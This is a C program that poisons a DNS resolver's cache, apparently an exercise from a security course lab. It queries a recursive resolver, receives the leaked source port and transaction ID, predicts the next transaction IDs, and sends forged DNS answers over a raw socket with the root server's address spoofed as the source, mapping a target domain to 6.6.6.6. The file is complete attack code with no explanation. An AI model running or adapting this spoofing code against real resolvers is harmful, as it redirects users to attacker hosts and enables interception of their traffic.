#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <ldns/ldns.h>
#include <unistd.h>
#include <stdint.h>
#include <pcap.h>
#include <signal.h>
#include <time.h>

#define TARGET_IP "192.168.1.203"  // Recursive resolver IP
#define ATTACK_DOMAIN "www.example.cybercourse.com"
#define DOMAIN_REQUEST "www.attacker.cybercourse.com"
#define POISED_IP "6.6.6.6"
#define ROOT_SERVER_IP "192.168.1.204" // Root IP

typedef struct {
    int port_num;
    uint16_t txid_val;
} received_client_data;

// Structure for the pseudo-header (used for UDP checksum calculation)
struct pseudo_header {
    uint32_t src_addr;
    uint32_t dest_addr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

// Checksum calculation
static uint16_t checksum(const void *b, int len) {
    const uint16_t *buf = b;
    uint32_t sum = 0;

    for (int i = 0; i < len / 2; i++) {
        sum += buf[i];
    }

    if (len % 2 != 0) {
        sum += ((uint8_t *)buf)[len - 1];
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)~sum;
}

static int compute_next_txids(uint16_t txid, uint16_t *next_txids) {
    int count = 0;  // Initialize the count to 0

    // Masks for calculations
    uint16_t m1 = 0x0057;  // Mask m1 (0b0000000001010111)
    uint16_t m2 = 0x0062;  // Mask m2 (0b0000000001100010)

    // Helper function to add predictions
    void add_predictions(uint16_t base, uint16_t modifier) {
        next_txids[count++] = base ^ modifier;
        next_txids[count++] = (base | 0x4000) ^ modifier;
        next_txids[count++] = (base | 0x8000) ^ modifier;
        next_txids[count++] = (base | 0xC000) ^ modifier;
    }

    // First two predictions (always present)
    add_predictions(0, txid >> 1);

    // Determine predictions based on parity of (txid >> 1)
    uint16_t shifted_txid = txid >> 1;
    uint16_t modified_txid = (shifted_txid ^ m1 ^ m2) >> 1;

    if (shifted_txid & 1) {
        // If both `y1=0` and `y2=0`
        add_predictions(0, modified_txid);

        // If both `y1=1` and `y2=1`
        add_predictions(0, modified_txid ^ m1 ^ m2);
    } else {
        // If `y1=1` and `y2=0`
        add_predictions(0, modified_txid ^ m1);

        // If `y1=0` and `y2=1`
        add_predictions(0, modified_txid ^ m2);
    }

    return count; // Return the total count of next_txids
}


void send_initial_query(const char* domain, const char *resolver_ip, int resolver_port) {
    // Configure the destination address
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in resolver_addr;
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(resolver_port);
    if (inet_pton(AF_INET, resolver_ip, &resolver_addr.sin_addr) <= 0) {
        perror("Invalid resolver IP address");
        close(sockfd);
        return;
    }

    uint8_t *wire;
    size_t len;

    ldns_rdf *domain_rdf = ldns_dname_new_frm_str(domain);
    if (!domain_rdf) {
        perror("Failed to create domain RDF");
        close(sockfd);
        return;
    }

    ldns_pkt *query_pkt = ldns_pkt_query_new(domain_rdf, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query_pkt) {
        ldns_rdf_deep_free(domain_rdf);
        close(sockfd);
        return;
    }

    if (ldns_pkt2wire(&wire, query_pkt, &len) != LDNS_STATUS_OK) {
        ldns_pkt_free(query_pkt);
        // ldns_rdf_deep_free(domain_rdf);
        close(sockfd);
        return;
    }

    // Send the query
    if (sendto(sockfd, wire, len, 0, (struct sockaddr *)&resolver_addr, sizeof(resolver_addr)) < 0) {
        perror("Failed to send DNS query");
    }

    free(wire); // Free serialized query
    ldns_pkt_free(query_pkt);
    close(sockfd);
}

received_client_data get_data_client() {
    int udp_socket;
    struct sockaddr_in local_address, remote_address;
    socklen_t remote_address_length = sizeof(remote_address);
    received_client_data client_data;

    // Create a UDP socket
    udp_socket = socket(AF_INET, SOCK_DGRAM, 0);

    // Configure the local address structure
    memset(&local_address, 0, sizeof(local_address));
    local_address.sin_family = AF_INET;
    local_address.sin_addr.s_addr = INADDR_ANY; // Accept connections from any address
    local_address.sin_port = htons(54321); // Specify the listening port

    // Bind the socket to the local address and port
    bind(udp_socket, (struct sockaddr *)&local_address, sizeof(local_address));

    // Receive data from the client
    recvfrom(udp_socket, &client_data, sizeof(client_data), 0,
             (struct sockaddr *)&remote_address, &remote_address_length);

    // Close the socket after receiving data
    close(udp_socket);

    return client_data;
}

// Step 3: Send spoofed responses
static void send_spoofed_responses(int num_port, uint16_t txid){
    uint16_t txids[10];
    compute_next_txids(txid, txids);

    for (int i = 0; i < 10; i++) {
        char packet[512];
        memset(packet, 0, sizeof(packet));

        //**Build the packet**

        // Build the DNS response packet
        ldns_pkt *response = ldns_pkt_new();
        ldns_pkt_set_id(response, txids[i]);
        ldns_pkt_set_qr(response, true);
        ldns_pkt_set_aa(response, true);
        ldns_pkt_set_ra(response, true);
        ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);

        // Question section
        ldns_rr *question = ldns_rr_new();
        ldns_rr_set_owner(question, ldns_dname_new_frm_str(ATTACK_DOMAIN));
        ldns_rr_set_type(question, LDNS_RR_TYPE_A);
        ldns_rr_set_class(question, LDNS_RR_CLASS_IN);
        ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);

        // Answer section
        ldns_rr *answer = ldns_rr_new();
        ldns_rr_set_owner(answer, ldns_dname_new_frm_str(ATTACK_DOMAIN));
        ldns_rr_set_type(answer, LDNS_RR_TYPE_A);
        ldns_rr_set_class(answer, LDNS_RR_CLASS_IN);
        ldns_rr_set_ttl(answer, 300);

        //IP section
        ldns_rr_push_rdf(answer, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, POISED_IP));
        ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer);

        uint8_t *dns_wire = NULL;
        size_t dns_size = 0;

        // OPT record section
        ldns_rr *opt_rr = ldns_rr_new();
        ldns_rr_set_owner(opt_rr, ldns_dname_new_frm_str("."));
        ldns_rr_set_type(opt_rr, LDNS_RR_TYPE_OPT);
        ldns_rr_set_class(opt_rr, 4096);
        ldns_rr_set_ttl(opt_rr, 0x8000);
        ldns_rr_set_rd_count(opt_rr, 0);
        ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, opt_rr);
        ldns_pkt2wire(&dns_wire, response, &dns_size);

        //**send_poised_ip_packet**

        // Fill IP header
        struct iphdr *ip_hdr = (struct iphdr *)packet;
        ip_hdr->version = 4;                       // IPv4 version
        ip_hdr->ihl = 5;                          // Header length (5 words = 20 bytes)
        ip_hdr->tos = 0;                          // Type of Service
        ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_size); // Total length
        ip_hdr->id = htons(54321);                // Identification field
        ip_hdr->frag_off = 0;                     // Fragment offset
        ip_hdr->ttl = 128;                        // Time-to-Live
        ip_hdr->protocol = IPPROTO_UDP;           // Protocol (UDP)
        ip_hdr->saddr = inet_addr(ROOT_SERVER_IP);     // Source IP address
        ip_hdr->daddr = inet_addr(TARGET_IP); // Destination IP address
        ip_hdr->check = 0;                        // Clear checksum initially
        ip_hdr->check = checksum((unsigned short *)ip_hdr, sizeof(struct iphdr)); // Calculate checksum

        // Fill UDP header
        struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
        udp->check = 0;
        udp->source = htons(53);
        udp->dest = htons(num_port);
        udp->len = htons(sizeof(struct udphdr) + dns_size);

        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_wire, dns_size);

        struct pseudo_header psh = {
                .src_addr = ip_hdr->saddr,
                .dest_addr = ip_hdr->daddr,
                .placeholder = 0,
                .protocol = IPPROTO_UDP,
                .udp_length = udp->len
        };

        char pseudo_packet[512];
        memcpy(pseudo_packet, &psh, sizeof(psh));
        memcpy(pseudo_packet + sizeof(psh), udp, sizeof(struct udphdr) + dns_size);

        udp->check = checksum(pseudo_packet, sizeof(psh) + sizeof(struct udphdr) + dns_size);

        // Create a raw socket
        int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        int flag = 1;
        setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag));

        // Initialize destination address structure
        struct sockaddr_in destination;
        memset(&destination, 0, sizeof(destination));
        destination.sin_family = AF_INET;
        destination.sin_addr.s_addr = inet_addr(TARGET_IP);

        sendto(raw_sock, packet, ntohs(ip_hdr->tot_len), 0,
               (struct sockaddr *)&destination, sizeof(destination));

        // Clean up
        close(raw_sock);
        free(dns_wire);
        ldns_pkt_free(response);
    }
}

int main() {
    send_initial_query(DOMAIN_REQUEST, TARGET_IP, 53);
    received_client_data data = get_data_client();
    send_spoofed_responses(data.port_num, data.txid_val);

    return 0;
}
